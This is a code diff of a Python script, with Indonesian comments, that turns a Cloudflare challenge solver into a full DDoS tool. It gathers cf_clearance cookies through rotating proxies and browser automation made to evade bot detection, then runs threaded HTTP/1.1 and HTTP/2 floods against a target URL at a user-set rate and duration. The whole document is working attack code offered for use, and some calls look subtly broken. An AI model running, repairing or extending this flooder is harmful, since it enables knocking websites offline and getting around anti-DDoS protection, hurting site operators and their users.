@@ -1,205 +1,344 @@
 import asyncio
 import sys
 import time
+import random
 import requests
-from dataclasses import dataclass
-from typing import Any, Dict
-
+import httpx
+import json
+from concurrent.futures import ThreadPoolExecutor
 from camoufox.async_api import AsyncCamoufox
-from browserforge.fingerprints import Screen
 from colorama import init, Fore, Style
 
 init(autoreset=True)
 
-@dataclass
-class CloudflareCookie:
-    name: str
-    value: str
-    domain: str
-    path: str
-    expires: int
-    http_only: bool
-    secure: bool
-    same_site: str
-
-    @classmethod
-    def from_json(cls, cookie_data: Dict[str, Any]) -> "CloudflareCookie":
-        return cls(
-            name=cookie_data.get("name", ""),
-            value=cookie_data.get("value", ""),
-            domain=cookie_data.get("domain", ""),
-            path=cookie_data.get("path", "/"),
-            expires=cookie_data.get("expires", 0),
-            http_only=cookie_data.get("httpOnly", False),
-            secure=cookie_data.get("secure", False),
-            same_site=cookie_data.get("sameSite", "Lax"),
-        )
-
-class SimpleCloudflareSolver:
-    def __init__(self, sleep_time=3, headless=True, os=None, debug=False, retries=10):
-        self.cf_clearance = None
-        self.sleep_time = sleep_time
-        self.headless = headless
-        self.os = os or ["windows"]
-        self.debug = debug
-        self.retries = retries
-
-    async def solve(self, link: str):
+class RealCloudflareBypass:
+    def __init__(self):
+        self.proxies = []
+        self.load_proxies()
+    
+    def load_proxies(self):
         try:
-            print(f"{Fore.GREEN}[info]{Style.RESET_ALL} Starting simple browser...")
+            with open("proxy.txt", "r") as f:
+                self.proxies = [line.strip() for line in f if line.strip()]
+            print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies")
+        except:
+            print(f"{Fore.RED}[-] proxy.txt not found")
+            sys.exit(1)
+    
+    def get_proxy(self):
+        return random.choice(self.proxies) if self.proxies else None
+
+    async def real_bypass(self, url: str):
+        for attempt in range(15):  # 15 attempts dengan proxy berbeda
+            proxy = self.get_proxy()
+            if not proxy:
+                continue
+                
+            print(f"{Fore.CYAN}[Attempt {attempt+1}] Using proxy: {proxy}")
             
-            async with AsyncCamoufox(
-                headless=self.headless,
-                os=self.os,
-                screen=Screen(max_width=1920, max_height=1080),
-                args=[
-                    "--no-sandbox",
-                    "--disable-dev-shm-usage",
-                    "--disable-infobars",
-                    "--start-maximized",
-                    "--lang=en-US,en;q=0.9",
-                    "--window-size=1920,1080",
-                ]
-            ) as browser:
-                page = await browser.new_page()
-                await page.set_viewport_size({"width": 1920, "height": 1080})
+            try:
+                proxy_url = f"http://{proxy}"
                 
-                print(f"{Fore.CYAN}[info]{Style.RESET_ALL} Navigating to: {link}")
-                await page.goto(link)
-                
-                # Strategi tunggu pasif - biarkan Cloudflare bekerja
-                print(f"{Fore.YELLOW}[info]{Style.RESET_ALL} Waiting for Cloudflare to process...")
-                
-                max_wait_time = 30  # 30 detik maksimal
-                wait_interval = 2   # Check setiap 2 detik
-                
-                for wait_cycle in range(max_wait_time // wait_interval):
-                    await asyncio.sleep(wait_interval)
+                async with AsyncCamoufox(
+                    headless=True,
+                    os=["windows"],
+                    args=[
+                        "--no-sandbox", 
+                        "--disable-dev-shm-usage",
+                        f"--proxy-server={proxy_url}",
+                        "--disable-blink-features=AutomationControlled",
+                        "--disable-web-security",
+                        "--disable-features=IsolateOrigins,site-per-process"
+                    ]
+                ) as browser:
+                    page = await browser.new_page()
                     
-                    title = await page.title()
-                    url = page.url
-                    frames = len(page.frames)
+                    # Enhanced human simulation
+                    await page.set_viewport_size({"width": 1920, "height": 1080})
                     
-                    print(f"{Fore.CYAN}[wait {wait_cycle * wait_interval}s]{Style.RESET_ALL} Title: '{title}' | Frames: {frames}")
+                    # Pre-navigation human behavior
+                    await page.mouse.move(random.randint(200, 600), random.randint(200, 400))
+                    await asyncio.sleep(random.uniform(1, 2))
                     
-                    # Cek indikator bahwa challenge selesai
-                    if "just a moment" not in title.lower() and "checking your browser" not in title.lower():
-                        print(f"{Fore.GREEN}[success]{Style.RESET_ALL} Challenge seems completed!")
-                        break
+                    # Navigate dengan referer dan extra headers
+                    await page.goto(url, 
+                                  timeout=90000, 
+                                  wait_until="networkidle",
+                                  referer="https://www.google.com/")
                     
-                    # Jika ada frame challenge, coba klik sekali saja
-                    challenge_frame_found = False
-                    for frame in page.frames:
-                        if "challenges.cloudflare.com" in frame.url:
-                            if not challenge_frame_found:  # Hanya klik sekali
-                                print(f"{Fore.YELLOW}[action]{Style.RESET_ALL} Clicking challenge frame...")
-                                try:
-                                    frame_element = await frame.frame_element()
-                                    box = await frame_element.bounding_box()
-                                    if box:
-                                        # Klik di tengah frame
-                                        click_x = box["x"] + box["width"] / 2
-                                        click_y = box["y"] + box["height"] / 2
-                                        await page.mouse.click(click_x, click_y)
-                                        challenge_frame_found = True
-                                except Exception as e:
-                                    print(f"{Fore.RED}[error]{Style.RESET_ALL} Click failed: {e}")
-                
-                # Tunggu tambahan untuk cookie
-                print(f"{Fore.CYAN}[info]{Style.RESET_ALL} Waiting for cookies...")
-                await asyncio.sleep(5)
-                
-                # Ambil semua cookie
-                cookies = await page.context.cookies()
-                ua = await page.evaluate("() => navigator.userAgent")
-                
-                print(f"{Fore.CYAN}[debug]{Style.RESET_ALL} Found {len(cookies)} cookies:")
-                for cookie in cookies:
-                    print(f"{Fore.CYAN}[debug]{Style.RESET_ALL} - {cookie['name']}: {cookie['value'][:30]}...")
-                
-                # Cari cf_clearance atau cookie Cloudflare lainnya
-                cf_cookie = next((c for c in cookies if c["name"] == "cf_clearance"), None)
-                
-                if cf_cookie:
-                    print(f"{Fore.GREEN}[success]{Style.RESET_ALL} cf_clearance found!")
-                    return cf_cookie['value'], ua
-                else:
-                    # Cari cookie Cloudflare lainnya
-                    cf_cookies = [c for c in cookies if any(cf_name in c["name"].lower() for cf_name in ['cf', '__cf', 'cloudflare'])]
+                    # Enhanced challenge detection and solving
+                    max_wait = 45
+                    solved = False
+                    
+                    for wait_cycle in range(max_wait // 3):
+                        await asyncio.sleep(3)
+                        
+                        current_title = await page.title()
+                        current_url = await page.url
+                        
+                        # Check if challenge is solved
+                        challenge_indicators = ["just a moment", "checking your browser", "ddos", "captcha"]
+                        if not any(indicator in current_title.lower() for indicator in challenge_indicators):
+                            # Additional verification - check if we can access content
+                            try:
+                                page_content = await page.content()
+                                if len(page_content) > 1000:  # Reasonable page size
+                                    print(f"{Fore.GREEN}[+] Cloudflare challenge SOLVED!")
+                                    solved = True
+                                    break
+                            except:
+                                pass
+                        
+                        # Advanced interaction strategies
+                        interaction_strategies = [
+                            lambda: page.mouse.click(random.randint(100, 800), random.randint(100, 600)),
+                            lambda: page.keyboard.press("Space"),
+                            lambda: page.evaluate("window.scrollBy(0, 300)"),
+                            lambda: page.mouse.move(random.randint(50, 400), random.randint(50, 300)),
+                        ]
+                        
+                        # Execute random interactions
+                        for strategy in random.sample(interaction_strategies, 2):
+                            try:
+                                await strategy()
+                                await asyncio.sleep(random.uniform(0.5, 1.5))
+                            except:
+                                pass
+                    
+                    if not solved:
+                        print(f"{Fore.YELLOW}[!] Challenge not solved, but continuing...")
+                    
+                    # Final verification and data extraction
+                    await asyncio.sleep(5)
+                    
+                    # Get all cookies with enhanced filtering
+                    cookies = await page.context.cookies()
+                    ua = await page.evaluate("() => navigator.userAgent")
+                    
+                    # Find Cloudflare cookies
+                    cf_cookies = []
+                    for cookie in cookies:
+                        cookie_name = cookie['name'].lower()
+                        if any(cf_key in cookie_name for cf_key in ['cf_clearance', '__cf', 'cf_']):
+                            cf_cookies.append(cookie)
                     
                     if cf_cookies:
-                        best_cookie = cf_cookies[0]
-                        print(f"{Fore.YELLOW}[fallback]{Style.RESET_ALL} Using {best_cookie['name']} as alternative")
-                        return best_cookie['value'], ua
-                    else:
-                        print(f"{Fore.RED}[error]{Style.RESET_ALL} No Cloudflare cookies found")
-                        return None, None
+                        best_cookie = cf_cookies[0]  # Take the first CF cookie
+                        print(f"{Fore.GREEN}[SUCCESS] Got Cloudflare cookie: {best_cookie['name']}")
+                        return best_cookie['value'], ua, proxy
+                    
+                    await browser.close()
+                    
+            except Exception as e:
+                error_msg = str(e)
+                if "timeout" in error_msg.lower():
+                    print(f"{Fore.YELLOW}[!] Proxy timeout: {proxy}")
+                elif "net::ERR" in error_msg:
+                    print(f"{Fore.YELLOW}[!] Proxy error: {proxy}")
+                continue
+        
+        print(f"{Fore.RED}[-] All proxy attempts failed")
+        return None, None, None
 
-        except Exception as e:
-            print(f"{Fore.RED}[error]{Style.RESET_ALL} Error: {e}")
-            return None, None
+class EffectiveFloodEngine:
+    def __init__(self):
+        self.total_requests = 0
+        self.successful_requests = 0
+        self.failed_requests = 0
+        self.proxies = []
+        self.load_proxies()
+    
+    def load_proxies(self):
+        try:
+            with open("proxy.txt", "r") as f:
+                self.proxies = [line.strip() for line in f if line.strip()]
+            print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} flood proxies")
+        except:
+            print(f"{Fore.RED}[-] proxy.txt not found")
+            sys.exit(1)
+    
+    def http1_attack_worker(self, target, cookie, ua, duration, requests_per_second, worker_id):
+        session = requests.Session()
+        start_time = time.time()
+        request_count = 0
+        
+        print(f"{Fore.CYAN}[Worker {worker_id}] Starting HTTP/1.1 flood...")
+        
+        while time.time() - start_time < duration:
+            batch_start = time.time()
+            
+            for _ in range(requests_per_second):
+                if time.time() - start_time >= duration:
+                    break
+                    
+                proxy = random.choice(self.proxies)
+                try:
+                    response = session.get(
+                        target,
+                        headers={
+                            'User-Agent': ua,
+                            'Cookie': f'cf_clearance={cookie}',
+                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                            'Accept-Language': 'en-US,en;q=0.5',
+                            'Accept-Encoding': 'gzip, deflate, br',
+                            'Connection': 'keep-alive',
+                            'Upgrade-Insecure-Requests': '1',
+                            'Sec-Fetch-Dest': 'document',
+                            'Sec-Fetch-Mode': 'navigate',
+                            'Sec-Fetch-Site': 'none',
+                            'Cache-Control': 'max-age=0',
+                        },
+                        proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
+                        timeout=5,
+                        verify=False
+                    )
+                    
+                    self.total_requests += 1
+                    self.successful_requests += 1
+                    request_count += 1
+                    
+                except Exception:
+                    self.total_requests += 1
+                    self.failed_requests += 1
+                    continue
+            
+            # Rate limiting
+            batch_time = time.time() - batch_start
+            if batch_time < 1.0:
+                time.sleep(1.0 - batch_time)
+            
+            if worker_id == 0 and self.total_requests % 500 == 0:
+                print(f"{Fore.GREEN}[Progress] Requests: {self.total_requests} | Success: {self.successful_requests} | Failed: {self.failed_requests}")
 
-async def main(url: str, duration: int):
-    solver = SimpleCloudflareSolver()
-    max_attempts = 5
-    cookie = None
-    ua = None
+    def http2_attack_worker(self, target, cookie, ua, duration, requests_per_second, worker_id):
+        async def http2_flood():
+            async with httpx.AsyncClient(
+                http2=True,
+                verify=False,
+                timeout=10
+            ) as client:
+                start_time = time.time()
+                request_count = 0
+                
+                print(f"{Fore.BLUE}[Worker {worker_id}] Starting HTTP/2 flood...")
+                
+                while time.time() - start_time < duration:
+                    batch_start = time.time()
+                    batch_requests = []
+                    
+                    for _ in range(requests_per_second):
+                        if time.time() - start_time >= duration:
+                            break
+                            
+                        proxy = random.choice(self.proxies)
+                        try:
+                            request = client.get(
+                                target,
+                                headers={
+                                    'User-Agent': ua,
+                                    'Cookie': f'cf_clearance={cookie}',
+                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                                    'Accept-Language': 'en-US,en;q=0.5',
+                                },
+                                proxies=f"http://{proxy}"
+                            )
+                            batch_requests.append(request)
+                            
+                        except Exception:
+                            self.total_requests += 1
+                            self.failed_requests += 1
+                    
+                    # Send batch requests
+                    if batch_requests:
+                        responses = await asyncio.gather(*batch_requests, return_exceptions=True)
+                        for response in responses:
+                            if isinstance(response, httpx.Response):
+                                self.total_requests += 1
+                                self.successful_requests += 1
+                                request_count += 1
+                            else:
+                                self.total_requests += 1
+                                self.failed_requests += 1
+                    
+                    # Rate limiting
+                    batch_time = time.time() - batch_start
+                    if batch_time < 1.0:
+                        await asyncio.sleep(1.0 - batch_time)
+                    
+                    if worker_id == 0 and self.total_requests % 500 == 0:
+                        print(f"{Fore.BLUE}[HTTP2 Progress] Requests: {self.total_requests} | Success: {self.successful_requests}")
+        
+        asyncio.run(http2_flood())
 
-    for attempt in range(1, max_attempts + 1):
-        print(f"{Fore.CYAN}[attempt]{Style.RESET_ALL} Attempt {attempt} to solve Cloudflare")
-        cookie, ua = await solver.solve(url)
-        if cookie and ua:
-            break
-        print(f"{Fore.RED}[retry]{Style.RESET_ALL} Retry after failure...")
+    def start_attack(self, target, cookie, ua, duration, threads, rates, http_version=1):
+        print(f"{Fore.RED}[+] STARTING REAL FLOOD ATTACK")
+        print(f"{Fore.CYAN}[+] Threads: {threads} | Rate: {rates}/s | Duration: {duration}s | HTTP: {http_version}")
+        
+        self.total_requests = 0
+        self.successful_requests = 0
+        self.failed_requests = 0
+        
+        requests_per_thread = max(1, rates // threads)
+        
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            for i in range(threads):
+                if http_version == 2:
+                    executor.submit(self.http2_attack_worker, target, cookie, ua, duration, requests_per_thread, i)
+                else:
+                    executor.submit(self.http1_attack_worker, target, cookie, ua, duration, requests_per_thread, i)
+        
+        print(f"{Fore.GREEN}[+] Attack completed!")
+        print(f"{Fore.GREEN}[+] Total requests: {self.total_requests}")
+        print(f"{Fore.GREEN}[+] Successful: {self.successful_requests}")
+        print(f"{Fore.RED}[+] Failed: {self.failed_requests}")
 
-    if not cookie or not ua:
-        print(f"{Fore.RED}[error]{Style.RESET_ALL} Failed to solve Cloudflare after {max_attempts} attempts")
+async def main():
+    if len(sys.argv) < 5:
+        print(f"{Fore.RED}Usage: python3 {sys.argv[0]} <url> <duration> <threads> <rates> [http_version=1]")
+        print(f"{Fore.YELLOW}Example: python3 {sys.argv[0]} https://target.com 60 500 1000")
+        print(f"{Fore.YELLOW}Example: python3 {sys.argv[0]} https://target.com 60 500 1000 2")
         return
 
-    print(f"[*] cf_clearance: {cookie}")
-    print(f"[*] User-Agent: {ua}")
-    print(f"[*] Starting flooder for {duration} seconds...\n")
+    url = sys.argv[1]
+    duration = int(sys.argv[2])
+    threads = int(sys.argv[3])
+    rates = int(sys.argv[4])
+    http_version = int(sys.argv[5]) if len(sys.argv) > 5 else 1
 
-    target = url
-    duration = duration
-    cookie = f"cf_clearance={cookie}"
-    userAgent = ua
+    print(f"{Fore.CYAN}[+] Target: {url}")
+    print(f"{Fore.CYAN}[+] Duration: {duration}s")
+    print(f"{Fore.CYAN}[+] Threads: {threads}")
+    print(f"{Fore.CYAN}[+] Rates: {rates}/s")
+    print(f"{Fore.CYAN}[+] HTTP Version: {http_version}")
 
-    print(f"[+] Target: {target}")
-    print(f"[+] Duration: {duration}s")
-    print(f"[+] Cookie: {cookie}")
-    print(f"[+] User-Agent: {userAgent}")
+    # Phase 1: Real Cloudflare Bypass
+    print(f"\n{Fore.GREEN}[PHASE 1] Real Cloudflare Bypass...")
+    
+    start_time = time.time()
+    bypass = RealCloudflareBypass()
+    cookie, ua, working_proxy = await bypass.real_bypass(url)
+    bypass_time = time.time() - start_time
 
-    def flood():
-        for _ in range(170):
-            try:
-                response = requests.get(target, headers={
-                    'User-Agent': userAgent,
-                    'Cookie': cookie
-                })
-                print(f"[+] Status: {response.status_code}")
-            except Exception as e:
-                pass
+    if not cookie:
+        print(f"{Fore.RED}[-] Cloudflare bypass failed after {bypass_time:.1f}s")
+        return
 
-    attack_interval = 0
-    while attack_interval < duration:
-        flood()
-        attack_interval += 1
-        time.sleep(1)
+    print(f"{Fore.GREEN}[+] Bypass successful in {bypass_time:.1f}s")
+    print(f"{Fore.GREEN}[+] Working proxy: {working_proxy}")
+    print(f"{Fore.GREEN}[+] Cookie length: {len(cookie)}")
+    print(f"{Fore.GREEN}[+] User-Agent: {ua[:80]}...")
 
-    print('Attack stopped.')
+    # Phase 2: Effective Flood Attack
+    print(f"\n{Fore.RED}[PHASE 2] Starting Effective Flood Attack...")
+    
+    flood = EffectiveFloodEngine()
+    flood.start_attack(url, cookie, ua, duration, threads, rates, http_version)
+
+    print(f"{Fore.GREEN}[+] Attack sequence completed successfully!")
 
 if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print(f"{Fore.RED}Usage:{Style.RESET_ALL} python3 simple.py <url> <duration_in_seconds>")
-        sys.exit(1)
-
-    url = sys.argv[1]
-    try:
-        duration = int(sys.argv[2])
-    except ValueError:
-        print(f"{Fore.RED}Error:{Style.RESET_ALL} Durasi harus berupa angka (dalam detik)")
-        sys.exit(1)
-
-    asyncio.run(main(url, duration))
+    # Disable warnings
+    from requests.packages.urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
     
+    asyncio.run(main())
